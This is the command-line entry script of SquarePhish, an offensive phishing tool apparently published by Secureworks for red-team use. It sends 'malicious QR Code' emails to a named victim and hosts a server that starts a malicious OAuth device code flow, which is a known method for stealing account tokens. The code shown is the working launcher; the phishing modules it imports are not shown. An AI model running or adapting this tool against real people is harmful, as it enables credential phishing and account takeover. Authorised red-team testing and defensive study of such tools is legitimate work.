#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Copyright 2022 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import urllib3
import logging
import argparse
from pathlib import Path
from configparser import NoOptionError
from configparser import DuplicateOptionError
from squarephish import utils
from squarephish.__init__ import __title__
from squarephish.__init__ import __version__
from squarephish.cfgparser import CustomConfigParser
from squarephish.modules.server import app
from squarephish.modules.server import init_app
from squarephish.modules.qrcode import QRCodeEmail
from squarephish.modules.emailer import Emailer

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app_info = f"{__title__} -- v{__version__}"


def parse_args() -> argparse.Namespace:
    """Parse command line arguments"""

    parser = argparse.ArgumentParser(description=app_info)

    # Create a parent parser and add common arguments before setting up the subparsers
    parent_parser = argparse.ArgumentParser(add_help=False)
    parent_parser.add_argument(
        "-h",
        "--help",
        action="store_true",
        help="show this help message and exit",
    )
    parent_parser.add_argument(
        "-c",
        "--config",
        type=str,
        default="settings.config",
        help="squarephish config file [Default: settings.config]",
    )
    parent_parser.add_argument(
        "--debug",
        action="store_true",
        help="enable server debugging",
    )

    # Create a subparser to handle 'email' and 'server' modules
    subparsers = parser.add_subparsers(
        title="modules",
        dest="module",
        required=True,
    )

    # Create 'email' parser
    email_parser = subparsers.add_parser(
        "email",
        parents=[parent_parser],
        add_help=False,
        help="send a malicious QR Code email to a provided victim",
    )
    email_parser.add_argument(
        "-e",
        "--email",
        type=str,
        help="victim email address to send initial QR code email to",
    )

    # Create 'server' parser
    server_parser = subparsers.add_parser(
        "server",
        parents=[parent_parser],
        add_help=False,
        help=(
            "host a malicious server QR Codes generated via the 'email' module will "
            "point to that will activate the malicious OAuth Device Code flow"
        ),
    )
    args = parser.parse_args()

    # Validate args
    if args.module == "email":
        if args.help:
            email_parser.print_help()
            sys.exit(1)

        if not args.email:
            parser.error("the following arguments are required: -e/--email")
            sys.exit(1)

    if args.module == "server":
        if args.help:
            server_parser.print_help()
            sys.exit(1)

    # Validate the config file exists
    if not Path(args.config).is_file():
        parser.error("invalid file for arguments: -c/--config")
        sys.exit(1)

    return args


def parse_config(config_file: str, module: str) -> CustomConfigParser:
    """Parse the provided configuration file

    :param config_file: configuration file to parse
    :param module:      executing module to validate config for
    """
    try:
        config = CustomConfigParser(
            comment_prefixes="#",
            inline_comment_prefixes="#",
        )
        config.read(config_file)

    except DuplicateOptionError as e:
        logging.error(f"Could not parse config file: {e}")
        sys.exit(1)

    # Validate sections
    if module == "email" and "EMAIL" not in config.sections():
        logging.error("Missing required config section: EMAIL")
        sys.exit(1)

    if module == "server" and "SERVER" not in config.sections():
        logging.error("Missing required config section: SERVER")
        sys.exit(1)

    # Validate the required data exists in the configuration file
    try:
        for val in utils.CONFIG_DEFAULT:
            if not config.get("DEFAULT", val):
                logging.error(f"Missing value for option '{val.lower()}' in section: 'DEFAULT'")  # fmt: skip
                sys.exit(1)

        if module == "email":
            for val in utils.CONFIG_EMAIL:
                if not config.get("EMAIL", val):
                    logging.error(f"Missing value for option '{val.lower()}' in section: 'EMAIL'")  # fmt: skip
                    sys.exit(1)

        if module == "server":
            for val in utils.CONFIG_SERVER:
                if not config.get("SERVER", val):
                    logging.error(f"Missing value for option '{val.lower()}' in section: 'SERVER'")  # fmt: skip
                    sys.exit(1)

    except NoOptionError as e:
        logging.error(f"Could not parse config file: {e}")
        sys.exit(1)

    # Parse template files here to identify valid/invalid files
    # Handle email module
    if module == "email":
        qrcode_template_file = config.get("EMAIL", "EMAIL_TEMPLATE")
        if not Path(qrcode_template_file).is_file():
            logging.error("Invalid QR code email template file")
            sys.exit(1)

        # Update the value from file name to file contents
        with open(qrcode_template_file, "r") as f:
            config.set("EMAIL", "EMAIL_TEMPLATE", f.read())

    if module == "server":
        devicecode_template_file = config.get("SERVER", "EMAIL_TEMPLATE")
        if not Path(devicecode_template_file).is_file():
            logging.error("Invalid device code email template file")
            sys.exit(1)

        # Update the value from file name to file contents
        with open(devicecode_template_file, "r") as f:
            config.set("SERVER", "EMAIL_TEMPLATE", f.read())

        # Validate cert files - if present
        try:
            if config.get("SERVER", "CERT_CRT") and config.get("SERVER", "CERT_KEY"):
                if (
                    not Path(config.get("SERVER", "CERT_CRT")).is_file()
                    or not Path(config.get("SERVER", "CERT_KEY")).is_file()
                ):
                    logging.error("Invalid server SSL certificate files")
                    sys.exit(1)
        except NoOptionError:
            pass

    return config


if __name__ == "__main__":
    print(utils.BANNER)

    # Parse command line arguments
    args = parse_args()

    # Initialize logging level and format
    utils.init_logger(args.debug)

    # Parse config file
    config = parse_config(config_file=args.config, module=args.module)

    # Initialize emailer object
    emailer = Emailer(config=config)

    if args.module == "email":
        emailed = QRCodeEmail.send_qrcode(
            email=args.email,
            config=config,
            emailer=emailer,
        )

        if not emailed:
            logging.error("Failed to send QR code to victim")

        else:
            logging.info(f"Successfully sent email to: {args.email}")

    elif args.module == "server":
        logging.info(f"Starting: {app_info}")
        init_app(
            config=config,
            emailer=emailer,
        )

        # If SSL certs are defined, set Flask SSL context
        # Catch NoOptionError exceptions in case these values are not
        # defined in the configuration - they are not a hard requirement
        ssl_context = "adhoc"
        try:
            ssl_context = (
                config.get("SERVER", "CERT_CRT"),
                config.get("SERVER", "CERT_KEY"),
            )
        except NoOptionError:
            pass

        try:
            app_port = int(config.get("SERVER", "PORT"))
        except ValueError:
            logging.error("Invalid server port defined in configuration")
            sys.exit(1)

        app.run(
            host="0.0.0.0",
            port=app_port,
            threaded=True,
            use_reloader=False,
            ssl_context=ssl_context,
        )

    else:
        logging.error("Invalid SquarePhish module")
